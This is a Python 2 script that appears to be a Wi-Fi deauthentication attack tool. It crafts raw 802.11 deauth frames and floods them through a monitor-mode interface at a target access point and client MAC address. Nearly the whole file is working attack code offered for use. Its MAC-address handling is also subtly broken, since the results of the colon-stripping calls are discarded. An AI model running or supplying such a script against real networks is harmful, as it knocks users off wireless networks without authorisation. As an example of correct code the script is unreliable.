#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import struct
from multiprocessing import Process
import os, sys
from time import sleep
import signal
from zlib import crc32


reset="\033[0;0m"
red="\033[38;5;9m"
byellow="\033[38;5;3m"
yellowb="\033[38;5;220m"
blue="\033[38;5;12m"
purple="\033[1;33;35m"
cyan="\033[38;5;6m"
white="\033[38;5;7m"
orange="\033[38;5;202m"
lblue="\033[38;5;117m"
green="\033[38;5;2m"



interface = 'wlan0mon'


s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
try:
    s.bind(('wlan0mon',0x0003))
except socket.error:
    print yellowb + "[!] Interface wlan0mon doesn't exist.." + reset
    print "\n"
#s.setblocking(0)



# Founded Access Point List





def banner():

    print " -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
    print " |             %s                   |" % (red + "Help Menu" + reset)
    print " |                                         |"
    print " |  --ap                 %s  |" % (orange + "Access point MAC" + reset)
    print " |  --client             %s        |" % (orange + "Client MAC" + reset)
    print " |  --frames             %s  |" % (orange + "Number of frames" + reset)
    print " |                                         |"
    print " -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
        
















#This is the Frame check sequence function. Just give it your 802.11 frame without the radiotap part 
# and of course don't include the last 4 bytes lol
def FSC(data):     
    x = struct.pack("!I", crc32(data) & 0xffffffff)[::-1]
    return x


def deauth(ap, client):
    radio = '\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
    frameCtrField = '\xc0\x00'
    duration = '\x3a\x01'

    receiver = client.decode('hex')
    destination = client.decode('hex')
    Transmitter = ap.decode('hex')
    frag = '\x00\x00'
    reason = '\x07\x00'
    

    # notice that Transmitter is written twice below since transmitter and source are actually the same
    frame = radio + frameCtrField + duration + receiver + Transmitter + Transmitter + frag + reason
    return frame

def deauth2(ap, client):
    radio = '\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
    frameCtrField = '\xc0\x00'
    duration = '\x3a\x01'
    Transmitter = client.decode('hex')
    receiver = ap.decode('hex')
    frag = '\x30\x00'
    reason = '\x07\x00'


    # this is the same as deauth function but the this time it's the 
    frame = radio + frameCtrField + duration + receiver + Transmitter + receiver + frag + reason
    return frame


def Sniff():
    num = 1

      

    ap = ''
    cl = ''
    if len(sys.argv) == 7:
        if sys.argv[1] == '--ap':
            #getting the access point mac address from argv
            ap_mac = sys.argv[2]
        if sys.argv[3] == '--client':
            #getting client mac address from argv
            client = sys.argv[4]
        if sys.argv[5] == '--frames':
            #getting number of frames from argv
            packets = sys.argv[6]
    else:
        banner()
        sys.exit()
    if ":" in ap_mac:
        ap_mac.replace(":", "")
        ap = ap_mac
    if ":" in client:
        client.replace(":", "")
        cl = client
    while num <= int(packets):
        frame = deauth(ap, cl)
        frame2 = deauth2(ap, cl)
        s.sendall(frame)
        s.sendall(frame2)
        print "[%s]" % (green + "Sent" + reset) + " ============= "+orange + "Frame " + str(num) + reset
        sleep(0.08)
        num += 1
            #    sleep(10)



if __name__ == "__main__":
    
    Sniff()




